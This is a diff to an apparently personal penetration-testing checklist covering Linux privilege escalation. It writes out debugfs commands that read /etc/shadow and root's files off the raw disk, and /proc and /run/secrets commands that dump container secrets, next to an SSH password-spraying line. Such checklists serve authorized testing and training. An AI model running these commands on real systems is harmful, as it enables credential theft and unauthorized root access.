@@ -61,20 +61,18 @@ nxc ssh <TargetIP> -u users.txt -p '<Password>' --continue-on-success
 - [ ] A database password is often a user's as well, or root's
 - [ ] The password worked for su: :Pb sudo for that user, and :Pb linux-enum again
 
-## Disk group read (debugfs)
+## The disk group: read the raw device
+A member of the disk group reads the block device itself, past every file permission.
+- [ ] id shows the disk group, and df / names the device, here /dev/sda1
+debugfs -R 'cat /etc/shadow' /dev/sda1
+debugfs -R 'ls /root' /dev/sda1
+- [ ] Whatever the listing shows, read the same way: root's SSH key first
+- [ ] No permission is checked: this reads the filesystem, and opens no file
 
-Membership in the disk (or video) group reads the raw block device, bypassing file permissions.
-
-- [ ] id shows disk or video group
-- [ ] Read /etc/shadow straight off the disk: debugfs -R 'cat /etc/shadow' /dev/sda1
-- [ ] Browse /root the same way: debugfs -R 'ls /root' /dev/sda1, then cat what you find
-- [ ] No DAC checks apply — you are reading the filesystem, not opening files
-
-## Container environment loot
-
-Containers hand you secrets through /proc.
-
-- [ ] Dump PID 1's environment: cat /proc/1/environ | tr '\0' '\n'
-- [ ] Sweep every process: /proc/*/environ the same way
-- [ ] Check launch commands: cat /proc/1/cmdline
-- [ ] Look for mounted secrets: ls /run/secrets
+## Inside a container: the environment
+Containers are given their secrets through the environment, and /proc shows it.
+cat /proc/1/environ | tr '\0' '\n'
+cat /proc/1/cmdline | tr '\0' ' '
+ls /run/secrets
+- [ ] Every other process the same way, through /proc/*/environ
+- [ ] Mounted secrets in /run/secrets, each one a file to read
